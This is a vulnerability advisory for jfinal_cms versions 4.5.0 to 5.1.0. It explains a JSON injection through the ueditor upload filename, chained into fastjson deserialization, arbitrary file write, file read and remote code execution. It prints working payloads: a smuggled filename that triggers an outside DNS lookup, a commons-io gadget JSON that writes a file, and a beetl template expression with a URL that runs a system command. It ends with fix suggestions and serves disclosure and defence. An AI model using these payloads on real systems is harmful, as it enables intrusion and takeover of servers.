# jfinal_cms has Json Injection vulnerability

#### TL;DR

`jfinal_cms` has a `json` injection vulnerability. A lower version of `fastjson` can lead to remote command execution in the foreground. The default `fastjson` version that `jfinal_cms` depends on meets the remote command execution conditions.

The reason is that the `com.baidu.ueditor.define.BaseState#toString` method processes `Map` key-value pairs through splicing. This vulnerability can be triggered through the `parseObject` function after escaping the malicious attributes. This vulnerability exists in `v4.0.0~v5.1.0` versions, and the `RCE` version is `v4.5.0~v.5.1.0`. In the latest version `v5.1.0`, it can be passed through `common-io` The chain enables arbitrary file writing, and by overwriting the template file, arbitrary command execution and arbitrary file reading can be achieved.

#### Versions Affected

`version affected`：`jfnal_cms v4.5.0~v5.1.0`

#### Find Gadget(Vulnerability Analysis)

The vulnerability lies in `com.baidu.ueditor.define.BaseState#toString`. The main logic is to traverse `map`, process `key` and `value` and finally make it into `JSON` string form.
Among them, `key` and `value` are spliced with `+`. If `key` or `value` is controllable, it may cause `json` injection problem.

![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1694866213804.jpg)

Looking for the `usage` of this function, we finally found that what can be used is that the `ActionEnter#invoke` method calls `state#toJSONString`. You can see that `Uploader# is triggered when `ActionMap` is an `UPLOAD_FILE` (file upload) operation. doExec`.

![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-2.png)

Let’s first look at the logic of `Uploader#doExec`. Here, different classes of `save` methods are called depending on whether `base64` is used. When the operation is `UPLOAD_FILE`, the `isBase64` of the configuration class `ConfigManager` is `false`.
```java
		case ActionMap.UPLOAD_FILE:
			conf.put("isBase64", "false");
			conf.put("maxSize", this.jsonConfig.getLong("fileMaxSize"));
			conf.put("allowFiles", this.getArray("fileAllowFiles"));
			conf.put("fieldName", this.jsonConfig.getString("fileFieldName"));
			savePath = this.jsonConfig.getString("filePathFormat");
			break;
```

So `Uploader#doExec` will trigger `BinaryUploader#save` when performing a file upload operation.
![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-3.png)

Auditing the `BinaryUploader#save` function, you can see that `originFileName` is controlled by `filename` of the upload form. It is worth noting that the program (only) verifies the suffix name. Here, `filename` is `filename=flag ","vulnerable":"hacked","a":".txt` can be bypassed, and finally put `originFileName` into `Map`.

![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-4.png)

Then trigger `toJSONString` to process the malicious characters into a string through splicing.

![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1694868670291.png)


Continuing to look up the exploit chain, we found that the above function call can be triggered through the `/ueditor` route, in which the returned `out` is a malicious string, and finally `out` is passed to `UeditorService#uploadHandle`.

![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1694868878079.png)

`UeditorService#uploadHandle` parses the malicious string through the `parseObject` method, and you can see that `json` has been contaminated.

![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-5.png)

Unfortunately, after being able to pollute the `json` attribute, I did not find any actual harm caused by the attribute value overridden by pollution.

Therefore, we can only find ways to use `parseObject`. The first attribute of `json`, `"state":"SUCCESS`", is uncontrollable. A small `trick` is used here, let `filename` be `flag", {"@type":"java.net .Inet4Address","val":"bgb5eh.ceye.io"},"a":".txt` can restore `Java Bean` normally.

Since the latest version of `v5.1.0` uses `fastjson` as `1.2.62` and does not have `autoType` enabled, as a novice I have not found a way to `RCE`. However, after testing, it was found that `v4.5.0~v5.0.1` all use `fastjson 1.2.28`, which can be bypassed by using cache. Just use `ldap` to create a `fastjson` full version deserialization chain `RCE`.

#### Exploit

Unfortunately, after being able to pollute the `json` attribute, I did not find any actual harm caused by polluting the overwritten attribute value, but you can start with the `parseObject` method.

##### Dnslog

The first attribute of `json`, `"state":"SUCCESS`", is uncontrollable. A small `trick` is used here, let `filename` be `flag", {"@type":"java.net .Inet4Address","val":"bgb5eh.ceye.io"},"a":".txt` can restore `Java Bean` normally.

`DNS` testing is performed in `v4.5.0` version, run the test script.

`dnslog` received the request, proving that the vulnerability exists. It is worth noting that if the version is between `v4.5.0-v5.0.1`, two `DNS` requests will be initiated, because these versions use `fastjson` by default The version is `1.2.28`, and testing in the `v5.1.0` version will only initiate a `dns` request.
![image-20230917132528175](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20230917132528175.png)

##### V4.5.0-V5.1.0——RCE

After testing, it was found that `v4.5.0~v5.0.1` all use `fastjson 1.2.28`, which can be bypassed by using cache. Just use `ldap` to create a `fastjson` full version deserialization chain. `RCE`.

`RCE` testing is conducted in `v5.0.1` version.

Run the `jndi` server.

![1694926217388](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1694926217388.png)

Run `exp.py` to `RCE`.

![1694926173785](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1694926173785.png)

##### V5.1.0——Arbitrary File Writing to Arbitrary File Reading

Before `1.2.68`, `autoType` could be bypassed by expecting classes, and this project happened to introduce `common-io2.7`, so an arbitrary file could be written.

```json
{
  "x":{
  "@type":"com.alibaba.fastjson.JSONObject",
  "input":{
  "@type":"java.lang.AutoCloseable",
  "@type":"org.apache.commons.io.input.ReaderInputStream",
  "reader":{
  "@type":"org.apache.commons.io.input.CharSequenceReader",
  "charSequence":{"@type":"java.lang.String""aaaaaa...(The length must be greater than 8192, and the first 8192 characters are actually written.)",
  "start":0,
  "end":2147483647
  },
  "charsetName":"UTF-8",
  "bufferSize":1024
  },
  "branch":{
  "@type":"java.lang.AutoCloseable",
  "@type":"org.apache.commons.io.output.WriterOutputStream",
  "writer":{
  "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
  "file":"/tmp/pwned",
  "charsetName":"UTF-8",
  "append": false
  },
  "charsetName":"UTF-8",
  "bufferSize": 1024,
  "writeImmediately": true
  },
  "trigger":{
  "@type":"java.lang.AutoCloseable",
  "@type":"org.apache.commons.io.input.XmlStreamReader",
  "inputStream":{
  "@type":"org.apache.commons.io.input.TeeInputStream",
  "input":{
  "$ref":"$.input"
  },
  "branch":{
  "$ref":"$.branch"
  },
  "closeBranch": true
  },
  "httpContentType":"text/xml",
  "lenient":false,
  "defaultEncoding":"UTF-8"
  },
  "trigger2":{
  "@type":"java.lang.AutoCloseable",
  "@type":"org.apache.commons.io.input.XmlStreamReader",
  "inputStream":{
  "@type":"org.apache.commons.io.input.TeeInputStream",
  "input":{
  "$ref":"$.input"
  },
  "branch":{
  "$ref":"$.branch"
  },
  "closeBranch": true
  },
  "httpContentType":"text/xml",
  "lenient":false,
  "defaultEncoding":"UTF-8"
  },
  "trigger3":{
  "@type":"java.lang.AutoCloseable",
  "@type":"org.apache.commons.io.input.XmlStreamReader",
  "inputStream":{
  "@type":"org.apache.commons.io.input.TeeInputStream",
  "input":{
  "$ref":"$.input"
  },
  "branch":{
  "$ref":"$.branch"
  },
  "closeBranch": true
  },
  "httpContentType":"text/xml",
  "lenient":false,
  "defaultEncoding":"UTF-8"
  }
  }
}
```

This project uses the `beetl` template, and the built-in function `printFile` supports file reading, so any file can be read by overwriting the template file.

The `web.xml` file is used here as an example.

![1695020177538](http://114.67.236.137/pic/1695262945189.png)

Visit the homepage and read the `web.xml` file.

![image-20230918150306193](http://114.67.236.137/pic/1695262869901.png)

##### V5.1.0——Arbitrary File Writing to Remote Code Execution

The template framework `beetl v3.0.13` that this project depends on is `RCE` capable.

```
${@Class.forName(parameter.a).newInstance().getEngineByName(parameter.b).eval(parameter.c)}
```

Write evil code to `jquery.html`.

![1695038407252](http://114.67.236.137/pic/1695038407252.png)

Finish！

`http://192.168.139.65:8080/jfinal_cms_war/?a=javax.script.ScriptEngineManager&b=js&c=java.lang.Runtime.getRuntime().exec("calc");`

![image-20230918200334314](http://114.67.236.137/pic/image-20230918200334314.png)

#### Founder

Squirt1e

#### Fix Suggestions

1. Do not use splicing when processing `key value` in the `com.baidu.ueditor.define.BaseState#toString` method,or filter commas, double quotes and other malicious characters when performing splicing processing.
2. Upgrade `fastjson` dependency to the latest version.
3. Upgrade `beetl` dependency to the latest version.